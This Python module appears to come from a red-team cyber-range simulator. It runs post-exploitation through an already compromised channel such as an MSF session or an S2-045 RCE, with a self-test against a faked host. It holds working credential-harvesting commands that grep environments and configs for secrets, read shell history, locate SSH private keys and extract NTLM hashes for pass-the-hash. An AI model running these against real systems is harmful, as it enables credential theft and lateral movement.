"""Earned-channel post-exploitation for the honest engine (D2-red i2).

Red enumerates and harvests credentials ON a host it ALREADY compromised, through the
access it EARNED — an MSF session (`MsfClient.session_execute`) or an RCE command channel
(e.g. the S2-045 OGNL `exploit.run_command`) — never via harness god-mode (`docker exec`).
The point is honesty: red only learns what its own foothold can see.

This is LOCAL post-ex on an owned box, so there is no cross-host reach here and nothing for
the floor to bound — the floor (kernel-enforced topology) bounds the LATERAL step that
reuses these findings, where out-of-scope hosts simply have no route. Every finding is
logged as a real `discovery` event (fidelity=real) so it re-derives from the hash chain and
gives blue's sensors real telemetry to see.

`exec_fn(cmd) -> str` is the earned channel: the caller passes
`lambda c: client.session_execute(sid, c)` for an MSF session, or
`lambda c: exploit.run_command(c, target=url)` for an RCE channel. Channel-agnostic by
construction, so it works for every foothold type red can earn.
"""
import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))  # run as `python swarm/live_postex.py`

# Standard host enumeration an operator runs first on a new foothold (identity, system,
# listening services, interfaces) — read-only situational awareness.
_ENUM = [
    ("identity", "id; whoami 2>/dev/null"),
    ("system", "uname -a 2>/dev/null"),
    ("listening", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"),
    ("interfaces", "ip -o -4 addr show 2>/dev/null || ifconfig 2>/dev/null"),
]

# Where ops credentials commonly get left on a host. Same locations the red toolkit has long
# searched (T1552/T1003), run here through the EARNED channel rather than docker exec.
# Double-quoted on purpose: red's earned channel may be an RCE that cannot carry a single
# quote (the OGNL payload wraps the command in its own single-quoted string), so every
# command here must be single-quote-free to run through any channel. Pipes / redirects /
# `;` still work — the channel runs them under `/bin/bash -c`.
# The config-file credential-key pattern. "cred" (not "credential") is deliberate: it catches both
# `credential` AND the planted `db_cred=` key (and `db_pass`, `dbcred`, …) that the narrower
# `credential` missed — the real DMZ loot `/etc/app/dbconfig.ini` holds `db_cred=…`, invisible to the
# old pattern. Still a read of the foothold's OWN filesystem (no map-blind leak); red discovers the
# config, it is not handed a ground-truth path.
_CONFIG_CRED_PATTERN = "pass|secret|cred|apikey|token"
_CRED_SEARCHES = [
    ("env_secrets", 'env 2>/dev/null | grep -iE "pass|secret|key|token|auth|cred" || true'),
    ("config_creds", f'grep -rliE "{_CONFIG_CRED_PATTERN}" /etc /opt /srv /var/www /usr/local 2>/dev/null | head -10'),
    # The credential VALUES inside those config files (the db_cred=… the DMZ foothold holds), read
    # from the foothold's own filesystem through the earned channel so red PIVOTS WITH THE HARVESTED
    # cred — not a credential handed in by the harness. A single `grep -rhiE` (recurse, -h = values
    # only) in ONE command: a `for f in $(...); do … done` construct returns EMPTY through the S2-045
    # OGNL RCE channel (verified live 2026-10-28 — the command substitution does not survive it),
    # whereas this does. Single-quote-free so it runs through any earned channel.
    ("config_values", f'grep -rhiE "({_CONFIG_CRED_PATTERN})[=:][^[:space:]]+" /etc /opt /srv /var/www /usr/local 2>/dev/null | head -20'),
    ("shell_history", 'cat /root/.bash_history ~/.bash_history 2>/dev/null | grep -iE "pass|secret|ssh |scp |mysql .*-p|psql" | head -10'),
    ("ssh_keys", 'ls -1 /root/.ssh/id_* /home/*/.ssh/id_* 2>/dev/null; find /root /home -maxdepth 3 -name "id_ed25519" -o -name "id_rsa" 2>/dev/null'),
    # cached OS-credential dumps left on a host (T1003): LSASS/secretsdump output, SAM/NTDS spills.
    # Grepped for NTLM-hash-shaped lines so a cached DA hash (the pass-the-hash edge to Tier 0) is
    # harvestable by owning the host that holds it — not handed from the range ground truth.
    ("cached_hashes", 'cat /root/.cache/*.dump /root/*.dmp /tmp/*.dump ~/.cache/*.dump 2>/dev/null '
                      '| grep -iE "[0-9a-f]{32}:::|:[0-9a-f]{32}:" | head -10'),
]

_KEY_RE = re.compile(r"(/[^\s:]+/id_(?:ed25519|rsa))")
# The NT hash from a cached secretsdump line `user:rid:lm:NT:::` — the 32-hex just before `:::`,
# for pass-the-hash reuse against the identity tier.
_NTLM_RE = re.compile(r":([0-9a-f]{32}):::")
# A harvested `key=value` / `key: value` config credential line (the db_cred=… the foothold holds).
# Key is the matched cred-ish token; value is the secret the lateral step reuses as a password.
_CFGVAL_RE = re.compile(r"^\s*([A-Za-z0-9_.\-]*(?:pass|secret|cred|apikey|token)[A-Za-z0-9_.\-]*)\s*[=:]\s*(\S+)",
                        re.IGNORECASE)


def _present(out):
    o = (out or "").strip()
    return bool(o) and "not found" not in o.lower() and not o.lower().startswith("no ")


def enumerate_and_harvest(exec_fn, log, *, actor="red", host="entry"):
    """Run enumeration + credential harvest through the earned channel `exec_fn`. Logs each
    as a real discovery event and returns {enum, creds, ssh_key_paths}. `creds`/key paths
    are what the lateral step will try to reuse against hosts red DISCOVERED (the floor
    decides which of those are reachable)."""
    enum = {}
    for label, cmd in _ENUM:
        out = exec_fn(cmd) or ""
        enum[label] = out.strip()[:400]
        log.append(actor, "discovery", {"fidelity": "real", "source": "foothold-postex",
                   "kind": "host_enum", "from": host, "what": label,
                   "observed": enum[label][:160]})

    creds, key_paths, ntlm_hashes, secrets = [], [], [], []
    for source, cmd in _CRED_SEARCHES:
        out = (exec_fn(cmd) or "").strip()
        if source == "ssh_keys":
            key_paths = sorted(set(_KEY_RE.findall(out)))
        if source == "cached_hashes":
            ntlm_hashes = sorted(set(_NTLM_RE.findall(out)))
        if source == "config_values":
            # the harvested plaintext credential VALUES — what the lateral reuses as a password.
            for ln in out.splitlines():
                m = _CFGVAL_RE.match(ln)
                if m and {"key": m.group(1), "value": m.group(2)} not in secrets:
                    secrets.append({"key": m.group(1), "value": m.group(2)})
        if _present(out):
            snippet = out[:200]
            creds.append({"source": source, "snippet": snippet})
            log.append(actor, "discovery", {"fidelity": "real", "source": "foothold-postex",
                       "kind": "credential", "from": host, "cred_source": source,
                       # the VALUE never enters the log (it is red's to use, not a logged secret);
                       # only the KEYS harvested are recorded, so the find re-derives without leaking.
                       "snippet": (snippet[:160] if source != "config_values"
                                   else ",".join(s["key"] for s in secrets[:8])),
                       "note": "harvested on the compromised host via the earned channel"})
    return {"enum": enum, "creds": creds, "ssh_key_paths": key_paths,
            "ntlm_hashes": ntlm_hashes, "secrets": secrets}


if __name__ == "__main__":  # self-check: earned-channel harvest, offline (no range)
    from swarm.eventlog import EventLog
    import tempfile, json as _json

    # A fake earned channel: a popped box that answers id/uname and has a deploy key + an
    # env secret. exec_fn is the ONLY way in — no docker exec, exactly as the real channel.
    FAKE = {
        "id; whoami 2>/dev/null": "uid=0(root) gid=0(root) groups=0(root)\nroot",
        "uname -a 2>/dev/null": "Linux range-struts 7.0.0 x86_64 GNU/Linux",
        "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null": "LISTEN 0 8080",
        "ip -o -4 addr show 2>/dev/null || ifconfig 2>/dev/null": "2: eth0 inet 10.9.0.3/24",
    }

    def exec_fn(cmd):
        if cmd in FAKE:
            return FAKE[cmd]
        if cmd.startswith("env"):
            return "DB_PASSWORD=s3cr3t-range-only\nAPI_TOKEN=abc123"
        if "id_ed25519" in cmd or "id_*" in cmd:
            return "/root/.ssh/id_ed25519\n/home/dbadmin/.ssh/id_ed25519"
        if cmd.startswith("grep -rhiE"):               # config_values: the key=value lines in the configs
            # the planted DMZ loot: db_cred=user:pass (invisible to the old `credential`-only pattern)
            # plus a non-secret neighbour (db_host) that must NOT be harvested as a credential value.
            return "db_host=db-core\ndb_cred=dbadmin:S3cr3t-DB-Range!\napi_token=tok_live_123"
        if cmd.startswith("grep -rliE"):
            return "/etc/app/dbconfig.ini\n/opt/app/config.properties"
        if ".dump" in cmd or "/.cache/" in cmd:   # a cached secretsdump left on the host (T1003)
            return "svc_da:1104:aad3b435b51404eeaad3b435b51404ee:670f33eb8bdc60aa8b0542c478c90851:::"
        return ""   # history empty

    p = Path(tempfile.mktemp(suffix=".jsonl")); log = EventLog(p)
    res = enumerate_and_harvest(exec_fn, log, host="entry")
    # enumeration ran through the earned channel and was logged
    assert res["enum"]["identity"].startswith("uid=0(root)"), res["enum"]
    # credentials were harvested: env secret + a config file + two ssh key paths
    sources = {c["source"] for c in res["creds"]}
    assert "env_secrets" in sources and "config_creds" in sources, sources
    assert res["ssh_key_paths"] == ["/home/dbadmin/.ssh/id_ed25519", "/root/.ssh/id_ed25519"], res["ssh_key_paths"]
    # the planted db_cred VALUE is harvested (the broadened pattern catches `db_cred`, which the old
    # `password|secret|credential|apikey` missed) so the lateral can PIVOT WITH THE HARVESTED cred.
    # The value is `user:pass` — the reuse layer splits it, so red harvests the DB user too (closing
    # the map-blind gap where the user was handed in).
    vals = {s["value"] for s in res["secrets"]}
    assert "dbadmin:S3cr3t-DB-Range!" in vals, ("db_cred value must be harvested", res["secrets"])
    assert "tok_live_123" in vals, res["secrets"]
    # db_host is NOT a credential and must not be harvested as one (no over-capture of neighbours)
    assert "db-core" not in vals, ("a non-secret config key must not be harvested as a cred", res["secrets"])
    assert _CONFIG_CRED_PATTERN and re.search(_CONFIG_CRED_PATTERN, "db_cred=x") and \
        re.search(_CONFIG_CRED_PATTERN, "password=x"), "the config pattern must match db_cred AND password"
    # the harvested VALUE never lands in the chain (red's to use, not a logged secret); only keys do
    import json as _jj
    _blob = p.read_text()
    assert "S3cr3t-DB-Range!" not in _blob, "a harvested secret VALUE must not be written to the log"
    assert "db_cred" in _blob, "the harvested KEY should be recorded (re-derivable find, no value)"
    # a cached DA NT hash was harvested from the dump (the pass-the-hash edge to Tier 0)
    assert res["ntlm_hashes"] == ["670f33eb8bdc60aa8b0542c478c90851"], res["ntlm_hashes"]
    assert "cached_hashes" in sources, sources
    # empty searches are NOT reported as finds (honest: no hit, no claim)
    assert "shell_history" not in sources, sources
    # every finding is a real, re-derivable discovery event on the chain
    ev = [_json.loads(x) for x in p.read_text().splitlines() if x.strip()]
    kinds = [e["data"].get("kind") for e in ev if e["action"] == "discovery"]
    assert kinds.count("host_enum") == 4 and kinds.count("credential") >= 2, kinds
    assert all(e["data"].get("fidelity") == "real" for e in ev if e["action"] == "discovery")
    p.unlink()
    print("live_postex ok (earned-channel post-ex: enumerates + harvests creds through the "
          "foothold's own access, not docker exec; ssh key paths parsed for lateral; empty "
          "searches make no claim; every finding a real re-derivable discovery event)")
